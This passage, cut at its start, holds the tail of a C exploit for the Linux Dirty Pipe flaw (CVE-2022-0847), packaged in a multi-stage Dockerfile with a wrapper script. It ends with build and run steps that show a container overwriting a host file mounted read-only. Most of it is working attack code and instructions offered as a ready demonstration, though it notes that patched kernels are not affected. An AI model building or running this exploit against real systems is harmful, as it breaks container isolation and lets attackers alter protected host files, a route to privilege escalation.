     * The actual exploit:
     * 1. Fill the pipe to allocate fresh pipe buffers
     * 2. Use splice() to bring a page from the read-only file into the pipe buffer.
     *    Due to the bug in copy_page_to_iter_pipe(), the PIPE_BUF_FLAG_CAN_MERGE
     *    flag is not cleared when it should be.
     * 3. Write to the pipe at an offset that causes a merge into the page cache.
     *    This bypasses the read-only mapping.
     */

    char buffer[PAGE_SIZE];
    memset(buffer, 0, PAGE_SIZE);

    /* Drain pipe buffers */
    for (int i = 0; i < 16; i++) {
        if (write(pipefd[1], buffer, PAGE_SIZE) < 0) {
            perror("write pipe");
            goto cleanup;
        }
    }

    /* 
     * Critical part: splice 1 byte from the target file.
     * This sets up the pipe buffer with a reference to the page cache page
     * of the read-only file AND the CAN_MERGE flag (the vulnerability).
     */
    loff_t offset = 1;  // start at byte 1 so we don't clobber the first byte immediately
    if (splice(fd, &offset, pipefd[1], NULL, 1, 0) < 0) {
        perror("splice");
        goto cleanup;
    }

    /* Now write our payload. The kernel merges it into the page cache page. */
    if (write(pipefd[1], payload, payload_len) < 0) {
        perror("write payload");
        goto cleanup;
    }

    printf("[+] Dirty Pipe exploit completed!\n");
    printf("[+] Overwrote '%s' (read-only from host) with: \"%s\"\n", filename, payload);
    printf("[+] Check the file on the *host* - it should now contain your payload.\n");

cleanup:
    close(pipefd[0]);
    close(pipefd[1]);
    close(fd);
    return 0;
}
EOF

RUN gcc -static -O2 -o /dirtypipe /dirtypipe.c \
    && strip /dirtypipe

# Final runtime image
FROM ubuntu:22.04

RUN apt-get update && apt-get install -y --no-install-recommends \
    file \
    && rm -rf /var/lib/apt/lists/*

COPY --from=builder /dirtypipe /usr/local/bin/dirtypipe

# Create a helper script
COPY <<'EOF' /demo.sh
#!/bin/sh
echo "=== Dirty Pipe (CVE-2022-0847) Container Demo ==="
echo ""
echo "This container demonstrates overwriting a read-only host file."
echo ""
echo "Run with:"
echo "  docker run -v /path/to/host/file.txt:/victim.txt:ro dirtypipe /victim.txt \"pwned from container via dirty pipe\""
echo ""
echo "The file on the host will be modified even though it was mounted read-only."
echo ""
echo "Usage inside container:"
echo "  dirtypipe <ro_file> <payload>"
echo ""
/usr/local/bin/dirtypipe "$@"
EOF

RUN chmod +x /demo.sh

ENTRYPOINT ["/demo.sh"]
CMD ["--help"]
```

### How to use it

1. **Build:**
   ```bash
   docker build -t dirtypipe .
   ```

2. **Demonstrate on host:**
   ```bash
   echo "This is a read-only file from the host" > /tmp/hostfile.txt
   chmod 644 /tmp/hostfile.txt

   docker run -v /tmp/hostfile.txt:/victim.txt:ro dirtypipe /victim.txt "OVERWRITTEN BY DIRTY PIPE FROM CONTAINER - $(date)"

   cat /tmp/hostfile.txt
   ```

The container will successfully modify the host file despite the `:ro` mount, demonstrating the **Dirty Pipe** vulnerability (CVE-2022-0847).

**Note:** This only works on vulnerable kernels (Linux 5.8 through 5.16.11, 5.15.25, 5.10.102, etc.). Modern kernels with the patch are not affected.

